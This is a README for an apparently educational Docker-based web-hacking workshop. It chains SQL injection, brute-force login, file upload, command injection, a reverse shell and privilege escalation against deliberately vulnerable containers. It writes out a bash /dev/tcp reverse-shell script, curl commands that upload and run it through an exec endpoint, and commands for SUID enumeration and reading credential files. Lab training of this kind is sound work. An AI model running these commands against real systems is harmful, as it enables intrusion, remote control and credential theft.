# Vulnerable Web Workshop

Welcome to the Vulnerable Web Workshop! This project is designed to help beginners learn about web vulnerabilities and how to exploit them in a controlled environment. The workshop will guide you through various steps, each focusing on different types of vulnerabilities commonly found in web applications.

---

## Prerequisites

Before starting, ensure you have the following installed on your machine:

| Tool | Version | Purpose |
|------|---------|---------|
| [Docker Desktop](https://www.docker.com/products/docker-desktop/) | Latest | Run the vulnerable web app containers |
| [Git](https://git-scm.com/) | Latest | Clone the repository |
| [Kali Linux](https://www.kali.org/) (VM or bare metal) | Latest | Attack machine with pre-installed tools |

### Recommended System Specs

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| RAM | 4 GB | 8 GB or more |
| CPU | 2 cores | 4 cores |
| Disk Space | 10 GB free | 20 GB free |
| OS (Host) | Windows 10 / macOS 11 / Ubuntu 20.04 | Latest stable |
| Network | Wi-Fi or Ethernet | Same LAN for host & Kali |

> **Low-spec tip:** If your machine has less than 8 GB RAM, close unnecessary applications before running Docker. You can also run Kali as a lightweight CLI-only VM (no GUI) to save resources.

### Kali Tools Used
- `nmap` — Port scanning & service detection
- `ffuf` — Web fuzzing & brute force login
- `curl` — HTTP requests
- `netcat (nc)` — Reverse shell listener
- `gobuster` — Directory enumeration

---

## Quick Start (Deployment)

### Step 1: Clone the Repository
```bash
git clone https://github.com/sev7n-sudo/HDA-Workshop.git
cd HDA-Workshop
```

### Step 2: Start the Application with Docker
```bash
cd server
docker compose up -d
```

This will start:
- **Web App** — Vulnerable Next.js application on port `3010`
- **Ubuntu Target** — Vulnerable Linux server for privilege escalation

### Step 3: Verify Containers are Running
```bash
docker compose ps
```

You should see:
```
NAME                     STATUS    PORTS
server-web-1             Running   0.0.0.0:3010->3000/tcp
server-ubuntu-target-1   Running
```

### Step 4: Get the Host Machine IP
```bash
# macOS
ipconfig getifaddr en0

# Linux
hostname -I | awk '{print $1}'
```

> **Important:** Students on Kali will use this IP to access the web app at `http://<host-ip>:3010`

### Step 5: Verify Access from Kali
```bash
# From Kali
nmap -sV -p 3010 <host-ip>
curl http://<host-ip>:3010
```

---

## Network Architecture

```
┌─────────────────────────────────────────────────┐
│              Docker Network (workshop-net)        │
│                                                  │
│  ┌──────────────┐       ┌───────────────────┐   │
│  │   web        │       │  ubuntu-target    │   │
│  │  (Next.js)   │       │  (Priv Esc Lab)   │   │
│  │  Port: 3000  │       │                   │   │
│  └──────────────┘       └───────────────────┘   │
│                                                  │
└──────────────────────────────────────────────────┘
         │ Port 3010
         ▼
┌─────────────────┐         ┌─────────────────┐
│   Host Machine  │◄───────►│   Kali Linux    │
│  (Docker Host)  │  LAN    │  (Attacker)     │
└─────────────────┘         └─────────────────┘
```

---

## Attack Kill Chain

This diagram shows how each step chains together to achieve full system compromise:

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                          ATTACK KILL CHAIN                                       │
└─────────────────────────────────────────────────────────────────────────────────┘

  Step 1                Step 2               Step 3               Step 4
┌──────────┐       ┌──────────────┐     ┌──────────────┐     ┌──────────────┐
│  RECON   │──────►│ SQL INJECTION│────►│BROKEN AUTH   │────►│FILE UPLOAD   │
│          │       │              │     │              │     │   & RCE      │
│• nmap    │       │• Extract     │     │• Brute force │     │• Upload      │
│• gobuster│       │  user data   │     │  with ffuf   │     │  shell.sh    │
│• curl    │       │• Find creds  │     │• Login as    │     │• Execute via │
│          │       │              │     │  admin       │     │  /api/exec   │
└──────────┘       └──────────────┘     └──────────────┘     └──────────────┘
                                                                     │
                                                                     ▼
  Step 7                Step 6               Step 5
┌──────────────┐   ┌──────────────┐     ┌──────────────┐
│PRIV ESC      │◄──│REVERSE SHELL │◄────│CMD INJECTION │
│              │   │              │     │              │
│• sudo -l    │   │• nc listener │     │• /api/exec   │
│• Exploit    │   │  on Kali     │     │• Run system  │
│  sudoers    │   │• bash -i     │     │  commands    │
│• ROOT! 🎯   │   │  reverse TCP │     │• Enumerate   │
└──────────────┘   └──────────────┘     └──────────────┘

Flow: Recon → SQLi → Auth Bypass → Upload Malicious File → Command Injection
      → Reverse Shell → Privilege Escalation → Full System Compromise 🏴
```

---

## Workshop Steps

| Step | Topic | Target | Guide |
|------|-------|--------|-------|
| 1 | Reconnaissance | Web App | [step-01-recon.md](src/workshop/step-01-recon.md) |
| 2 | SQL Injection | Web App (`/api/search`) | [step-02-sql-injection.md](src/workshop/step-02-sql-injection.md) |
| 3 | Broken Authentication | Web App (`/api/login`) | [step-03-broken-auth.md](src/workshop/step-03-broken-auth.md) |
| 4 | File Upload & RCE | Web App (`/api/upload`) | [step-04-file-upload-rce.md](src/workshop/step-04-file-upload-rce.md) |
| 5 | Command Injection | Web App (`/api/exec`) | [step-05-command-injection.md](src/workshop/step-05-command-injection.md) |
| 6 | Reverse Shell | Web App → Kali | [step-06-reverse-shell.md](src/workshop/step-06-reverse-shell.md) |
| 7 | Privilege Escalation | Ubuntu Target | [step-07-privilege-escalation-ubuntu.md](src/workshop/step-07-privilege-escalation-ubuntu.md) |

> 📖 **Need help?** Click the **Guide** link for each step to see detailed instructions, example commands, and explanations.

### Additional Resources
- [Commands Cheatsheet](src/workshop/commands-cheatsheet.md) — Quick reference for all commands used in the workshop
- [Student Guide](docs/student-guide.md) — Overview and tips for students
- [Instructor Guide](docs/instructor-guide.md) — Setup and teaching notes for instructors

---

## Key Endpoints

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/` | GET | Landing page |
| `/login` | GET | Login page |
| `/search` | GET | Search page (SQL injection) |
| `/upload` | GET | File upload page |
| `/api/login` | POST | Authentication API (JSON) |
| `/api/search` | GET | Search API (SQL injection) |
| `/api/upload` | POST | File upload API |
| `/api/exec` | GET | Command execution API (`?cmd=`) |
| `/uploads/` | GET | View uploaded files |

---

## Reverse Shell Setup

### On Kali (listener):
```bash
nc -lvnp 4444
```

### Create `shell.sh`:
```bash
#!/bin/bash
bash -i >& /dev/tcp/<KALI-IP>/4444 0>&1
```

### Upload and trigger:
```bash
# Upload
curl -F "file=@shell.sh" http://<host-ip>:3010/api/upload

# Execute
curl "http://<host-ip>:3010/api/exec?cmd=bash%20/usr/src/app/public/uploads/shell.sh"
```

> **Note:** Kali must be reachable from the Docker container. If on the same LAN as the host machine, use Kali's LAN IP.

---

## Privilege Escalation (Ubuntu Target)

Access the ubuntu-target from the host:
```bash
docker exec -it server-ubuntu-target-1 bash
```

Or from within a reverse shell on the web container:
```bash
# Pivot to ubuntu-target (same Docker network)
curl http://ubuntu-target:3000
```

Key commands inside ubuntu-target:
```bash
whoami
sudo -l
find / -perm -4000 -exec ls -la {} \;
cat /opt/techcorp/.env
```

---

## Stopping the Lab

```bash
cd server
docker compose down
```

---

## Troubleshooting

| Problem | Solution |
|---------|----------|
| Can't access from Kali | Check host IP with `ipconfig getifaddr en0`, ensure same network |
| Port 3010 not open | Run `docker compose ps`, ensure web container is running |
| Reverse shell won't connect | Ensure Kali IP is reachable from container: `docker exec server-web-1 bash -c "echo test > /dev/tcp/<kali-ip>/4444"` |
| Container crashed | Run `docker compose logs web` to check errors |

---

## Learning Objectives

By the end of this workshop, you will have a better understanding of:

- Common web vulnerabilities and their exploitation
- Techniques for securing web applications against these vulnerabilities
- Practical experience using offensive security tools (nmap, ffuf, netcat, curl)
- How attackers chain vulnerabilities to gain full system access

---

## Important Notes

- This workshop is intended for **educational purposes only**. Do not use the knowledge gained here for malicious activities.
- Ensure you have permission to test any applications or systems outside of this workshop environment.
- All attacks should only be performed within this isolated Docker environment.

Happy learning and hacking!